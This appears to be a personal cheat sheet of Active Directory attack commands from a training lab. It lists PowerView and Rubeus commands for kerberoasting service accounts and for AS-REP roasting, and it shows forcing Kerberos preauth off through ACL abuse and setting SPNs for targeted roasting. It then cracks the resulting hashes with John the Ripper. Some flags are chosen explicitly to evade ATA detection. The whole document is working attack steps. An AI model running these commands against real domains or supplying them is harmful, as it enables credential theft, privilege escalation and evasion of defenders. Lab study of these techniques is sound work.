*** KERBEROASTABLE ACCOUNTS ARE A VERY GOOD DECOY ***
*** CHECK IF IT IS NOT A DECOY ***


# FIND USER ACCOUNTS USED AS SERVICE ACCOUNTS
# With PowerView

Get-DomainUser -SPN

# krbtgt will always show, but its pw is set by machines so it will be very very hard to brute force it.

# CHECK MEMBEROF -> DOMAIN ADMINS GROUP = GOOD.

# USING RUBEUS
# To list Kerberoast stats
Rubeus.exe kerberoast /stats
# To request a TGS
Rubeus.exe kerberoast /user:svcadmin /simple

# To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of ATA -0x17 stands for rc4-hmac), look for kerberoastable accounts that only support rc4_hmac
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec

# Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# EXAMPLE OF SAVING HASH OF A SERVICE DOMAIN ACCOUNT AND CRACKING PASSWORD
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
iF ERRORS -> ERASE :1443 (PORT OF THE SERVICE IN THE TICKET FOR EXAMPLE). GIVES PROBLEMS WHILE CRACKING HASHES.



# ENUM ACCOUNTS WITH KERBEROS PREATUH DISABLED
Get-DomainUser -PreauthNotRequired -Verbose

# FORCE DISABLE KERBEROS PREAUTH
# Enumerate the permissions for RDPUsers on ACLs 
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
Set-DomainObject -Identity Control575User -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Verbose


# REQUEST ENCRYPTED AS-REP for Offline Brute-Force
# ASREP ROAST
Get-ASREPHash -UserName VPN575user -Verbose

#Enumerate all users with kerberos preauth disabled and request a hash
Invoke-ASREPRoast -Verbose

# USE JOHN TO BRUTE FORCE THE HASHES OFFLINE

# SPN KERBEROASTING
# SET A SPN FOR THE USER (MUST BE UNIQUE FOR THE FOREST)
Set-DomainObject -Identity support575user -Set @{serviceprincipalname='ops/whatever1'}

# ONCE THE SPN IS SET WE CAN KERBEROAST THE USER
Rubeus.exe kerberoast /outfile:targetedhashes.txt
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt


